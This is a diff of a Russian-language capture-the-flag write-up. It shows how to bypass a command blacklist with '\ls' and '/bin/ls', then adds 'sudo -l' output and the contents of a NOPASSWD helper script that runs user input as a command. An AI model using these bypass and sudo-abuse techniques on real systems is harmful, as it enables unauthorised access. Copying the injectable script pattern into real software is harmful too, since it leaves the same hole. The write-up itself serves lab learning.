@@ -24,8 +24,17 @@
 <img width="1271" height="651" alt="Снимок экрана 2026-05-01 в 08 11 21" src="https://github.com/user-attachments/assets/f7b40c46-7f69-4cd9-a8d8-1ebf02f86618" />
 Однако этот запрет можно обойти: вот два примера: первый это обратный слэш ```\ls``` и второй это обратиться к нему на прямую```/bin/ls``` (на самом деле способов кратно больше, привел самые простые)
 и вот результат: <img width="287" height="104" alt="Снимок экрана 2026-05-01 в 08 20 14" src="https://github.com/user-attachments/assets/49f2c990-2c6e-4854-9e9e-9f47d3410406" />
-
-
+```
+sudo -l
+```
+```
+NOPASSWD: /home/apaar/.helpline.sh
+```
+```
+\cat /home/apaar/.helpline.sh
+```
+```
+#!/bin/bash echo echo "Welcome to helpdesk. Feel free to talk to anyone at any time!" echo read -p "Enter the person whom you want to talk with: " person read -p "Hello user! I am $person, Please enter your message: " msg $msg 2>/dev/null echo "Thank you for your precious time!" 
 
 
 
